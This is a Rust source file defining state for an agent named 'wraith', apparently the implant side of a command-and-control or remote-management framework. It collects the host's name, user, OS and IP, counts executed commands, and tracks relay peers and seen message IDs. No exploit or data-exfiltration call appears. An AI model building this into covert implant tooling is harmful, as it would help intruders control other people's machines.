use crate::relay::RelayManager;
use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use tokio::sync::mpsc;

pub struct PeerConnection {
    pub wraith_id: String,
    pub hostname: String,
    pub connected_at: i64,
    pub sender: mpsc::Sender<crate::proto::wraith::WraithMessage>,
}

pub struct WraithState {
    pub relay_manager: Arc<Mutex<RelayManager>>,
    pub wraith_id: String,
    pub peer_table: HashMap<String, PeerConnection>,
    pub seen_message_ids: std::sync::Mutex<HashSet<String>>,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub ip_address: String,
    pub commands_executed: i64,
    pub last_command_time: i64,
    pub connected: bool,
}

impl WraithState {
    pub fn new() -> Self {
        let hostname = hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "unknown".to_string());

        let username = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());

        let os = std::env::consts::OS.to_string();
        let ip_address = "0.0.0.0".to_string();
        let wraith_id = uuid::Uuid::new_v4().to_string();

        Self {
            relay_manager: Arc::new(Mutex::new(RelayManager::new())),
            wraith_id,
            peer_table: HashMap::new(),
            seen_message_ids: std::sync::Mutex::new(HashSet::new()),
            hostname,
            username,
            os,
            ip_address,
            commands_executed: 0,
            last_command_time: 0,
            connected: false,
        }
    }

    pub fn new_with_relay_manager(wraith_id: String, relay_manager: Arc<Mutex<RelayManager>>) -> Self {
        let hostname = hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "unknown".to_string());

        let username = std::env::var("USER")
            .or_else(|_| std::env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string());

        let os = std::env::consts::OS.to_string();
        let ip_address = "0.0.0.0".to_string();

        Self {
            relay_manager,
            wraith_id,
            peer_table: HashMap::new(),
            seen_message_ids: std::sync::Mutex::new(HashSet::new()),
            hostname,
            username,
            os,
            ip_address,
            commands_executed: 0,
            last_command_time: 0,
            connected: false,
        }
    }

    pub fn set_connected(&mut self, connected: bool) {
        self.connected = connected;
    }

    pub fn increment_commands(&mut self) {
        self.commands_executed += 1;
        self.last_command_time = chrono::Utc::now().timestamp_millis();
    }

    pub fn set_wraith_id(&mut self, id: String) {
        self.wraith_id = id;
    }

    pub fn add_peer(&mut self, wraith_id: String, hostname: String, sender: mpsc::Sender<crate::proto::wraith::WraithMessage>) {
        let connected_at = chrono::Utc::now().timestamp_millis();
        self.peer_table.insert(wraith_id.clone(), PeerConnection {
            wraith_id,
            hostname,
            connected_at,
            sender,
        });
    }

    pub fn remove_peer(&mut self, wraith_id: &str) -> Option<PeerConnection> {
        self.peer_table.remove(wraith_id)
    }

    pub fn has_seen_message(&self, message_id: &str) -> bool {
        self.seen_message_ids.lock().unwrap().contains(message_id)
    }

    pub fn mark_message_seen(&self, message_id: String) {
        self.seen_message_ids.lock().unwrap().insert(message_id);
    }
}

impl Default for WraithState {
    fn default() -> Self {
        Self::new()
    }
}